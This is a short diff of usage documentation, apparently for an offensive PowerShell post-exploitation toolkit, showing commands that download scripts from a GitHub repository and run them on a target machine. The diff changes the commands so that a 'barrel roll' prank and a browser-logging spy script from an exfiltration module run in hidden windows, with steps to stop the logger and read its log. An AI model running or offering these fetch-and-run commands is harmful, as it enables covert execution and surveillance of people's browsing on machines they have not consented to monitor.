@@ -137,18 +137,17 @@ Start-Process -WindowStyle Hidden powershell -ArgumentList "-file FWUprank.ps1 -
 #### Do A Barrel Roll Loop Prank
 ```powershell
 iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Misc-CmdLets/Prank2.ps1" -OutFile "Prank2.ps1"
-
 # Start the Prank after 3 seconds, loop the prank a max of 5 times with 20 seconds delay before the next loop
-powershell -File "Prank2.ps1" -StartDelay "3" -LoopRange "5" -LoopDelay "20" -AutoDel "on" -MsgBoxClose "8"
+Start-Process -WindowStyle Hidden powershell -ArgumentList "-File Prank2.ps1 -StartDelay 3 -LoopRange 5 -LoopDelay 20 -AutoDel on -MsgBoxClose 8"
 ```
 
 #### Spying target webbrowser active tab windows title
 ```powershell
 iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/browserLogger.ps1" -OutFile "browserLogger.ps1"
-powershell -file BrowserLogger.ps1 -force 'true' -log
+Start-Process -WindowStyle Hidden powershell -ArgumentList "-file BrowserLogger.ps1 -force 'true' -log"
 
 # Manual stop browserLogger process thats running in background
-$PPID = (Get-Content -Path "$pwd\Browser.report"|Select-String -Pattern '\s*Process Id+\s*:+\s') -replace '\s*Process Id+\s*:+\s',''
+$PPID = (Get-Content -Path "Browser.report"|Select-String -Pattern '\s*Process Id+\s*:+\s') -replace '\s*Process Id+\s*:+\s',''
 Stop-Process -Id "$PPID" -Force
 
 # Manual read logfile entrys
